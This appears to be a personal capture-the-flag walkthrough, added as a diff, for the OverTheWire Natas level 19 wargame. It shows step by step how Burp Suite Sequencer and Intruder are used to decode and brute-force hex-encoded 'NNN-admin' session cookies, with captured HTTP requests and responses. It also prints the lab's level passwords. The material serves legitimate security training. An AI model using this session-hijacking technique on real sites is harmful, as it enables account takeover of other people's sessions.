@@ -1,0 +1,187 @@
+PASSWORD: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+
+URL: http://natas19.natas.labs.overthewire.org/
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+Please login with your admin account to retrieve credentials for natas20.
+Username: admin
+Password: admin
+LOGIN
+
+URL: http://natas19.natas.labs.overthewire.org/index.php
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.
+
+*BURP SUITE*
+*TOGGLE Intercept is on
+
+*WEB BROWSER*
+URL: http://natas19.natas.labs.overthewire.org/
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+Please login with your admin account to retrieve credentials for natas20.
+Username: admin
+Password: admin
+LOGIN
+
+*BURP SUITE*
+POST /index.php HTTP/1.1
+Host: natas19.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://natas19.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==
+Connection: close
+Referer: http://natas19.natas.labs.overthewire.org/
+Cookie: PHPSESSID=3538302d61646d696e  <-----DECODE COOKIE
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin
+
+*COPY COOKIE 3538302d61646d696e*
+*3538302d61646d696e  <-----DECODED AS ASCIIHEX = 580-admin
+
+*BURP SUITE*
+*TOGGLE Intercept is off
+
+*WEB BROWSER*
+*SHIFT+CTRL+I
+*TOGGLE STORAGE
+*TOGGLE COOKIES AND DELETE VALUE
+
+*BURP SUITE*
+*TOGGLE Intercept is on
+
+*WEB BROWSER*
+*TOGGLE PREVIOUS PAGE
+URL: http://natas19.natas.labs.overthewire.org/
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+Please login with your admin account to retrieve credentials for natas20.
+Username: admin
+Password: admin
+LOGIN
+
+*BURP SUITE*
+*FORWARD/SEND - TO RECIEVE A COOKIE FROM THE SERVER-SIDE/RESPONSE 
+
+*WEB BROWSER*
+*TOGGLE PREVIOUS PAGE
+URL: http://natas19.natas.labs.overthewire.org/
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+Please login with your admin account to retrieve credentials for natas20.
+Username: admin
+Password: admin
+LOGIN AGAIN
+
+*BURP SUITE*
+*SEND TO Sequencer
+*TOGGLE Intercept is off
+*TOGGLE TO Sequencer
+*TOKEN LOCATION WITHIN RESPONSE SHOULD HAVE A COOKIE*
+*TOGGLE START LIVE CAPTURE - STOP AT 500 REQUEST*
+*TOGGLE ANALYZE NOW*
+*TOGGLE BIT-LEVEL ANALYSIS - IF YOU SEE RED CHARTS, IT CAN BE BRUTE-FORCED* 
+*TOGGLE COPY TOKENS*
+
+*TOGGLE DECODER*
+*PASTE TOKENS*
+*DECODE AS ASCIIHEX*
+*FIND THE GREATEST NUMBER OF -admin
+
+*TOGGLE Intercept is on
+
+*WEB BROWSER*
+URL: http://natas19.natas.labs.overthewire.org/index.php
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.
+*REFRESH TO CAPTURE COOKIE*
+
+*BURP SUITE*
+*SEND TO Intruder
+*TOGGLE Intruder*
+*TOGGLE CLEAR$
+*SELECT THE WHOLE COOKIE AND TOGGLE ADD$
+*TOGGLE PAYLOADS
+*PAYLOAD SET 1
+*PAYLOAD TYPE NUMBERS
+*NUMBER RANGE
+*TYPE SEQUENTIAL
+*FROM 1
+*TO 680  <-----THE GREASTEST NUMBER of -admin
+*STEP 1
+*PAYLOAD PROCESSING
+*ADD-ADD SUFFIX -admin
+*ADD-ENCODE-ENCODE AS ASCII HEX
+*START ATTACK*
+*TOGGLE LENGTH*
+*REQUEST 281 HAS THE GREATEST LENGTH OF 1408
+*REQUEST*
+GET / HTTP/1.1
+Host: natas19.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==
+Connection: keep-alive
+Cookie: PHPSESSID=3238312d61646d696e <-----NEW COOKIE
+Upgrade-Insecure-Requests: 1
+*RESPONSE*
+HTTP/1.1 200 OK
+Date: Sun, 02 Jun 2024 09:11:52 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1070
+Keep-Alive: timeout=5, max=72
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH  <-----PASSWORD
+</pre></div>
+</body>
+</html>
+
+*BURP SUITE*
+*TOGGLE Intercept is off
+
+*WEB BROWSER*
+*SHIFT+CTRL+I
+*TOGGLE STORAGE
+*TOGGLE COOKIES AND DELETE VALUE AND ADD NEW COOKIE VALUE - 3238312d61646d696e
+ 
+URL: http://natas19.natas.labs.overthewire.org/
+
+
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+You are an admin. The credentials for the next level are:
+
+Username: natas20
+Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
